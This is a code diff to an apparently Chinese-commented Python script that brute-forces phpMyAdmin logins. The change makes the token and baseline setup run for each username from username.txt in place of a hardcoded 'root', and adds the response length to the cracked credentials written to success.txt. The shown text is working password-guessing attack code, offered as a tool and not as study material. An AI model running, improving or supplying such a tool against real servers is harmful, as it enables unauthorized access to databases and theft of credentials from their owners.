@@ -37,9 +37,10 @@ def pma_login(uname, pwd, token):
         return
 
 
-def init(url):
+def init(url, uname):
     """
     请求给定的url，获取phpmyadmin的token和输入错误密码的请求头长度
+    :param uname:
     :param url: phpmyadmin 的 url 如 localhost:8080 即可
     :return: 登录所需的 token 和 输入错误密码的请求头长度 contentLengthRaw
     """
@@ -57,7 +58,7 @@ def init(url):
     token = str(token).replace("[u\'", "").replace("\']", "")
     print("[!]Token:" + token)
 
-    r = pma_login('root', 'error_password_t3ri', token)
+    r = pma_login(uname, 'error_password_t3ri', token)
 
     contentLengthRaw = len(r.text)
 
@@ -89,7 +90,7 @@ def crack_pma(uname, pwd, token, contentLengthRaw):
     else:
         print("[+]返回头长度为:" + str(contentLength) + " 密码正确！")
         coolcat = open("success.txt", "a")
-        coolcat.write(url + "的" + str(uname) + "密码为:" + str(pwd) + "\n")
+        coolcat.write(url + "的 " + str(uname) + " 密码为:" + str(pwd) + " 返回头长度为:" + str(contentLength) + "\n")
         coolcat.close()
         exit(0)
 
@@ -106,13 +107,12 @@ if __name__ == '__main__':
     url = input("URL:")
     url = url.replace("\n", "").replace("\r", "").replace("index.php", "")
 
-    token, contentLengthRaw = init(url)
-
     # 初始化线程池
     wm = WorkManager(theadNum)
 
     for uname in open("username.txt"):
         uname = uname.replace("\r", "").replace("\n", "")
+        token, contentLengthRaw = init(url, uname)
         for pwd in open("password.txt"):
             pwd = pwd.replace("\r", "").replace("\n", "")
 
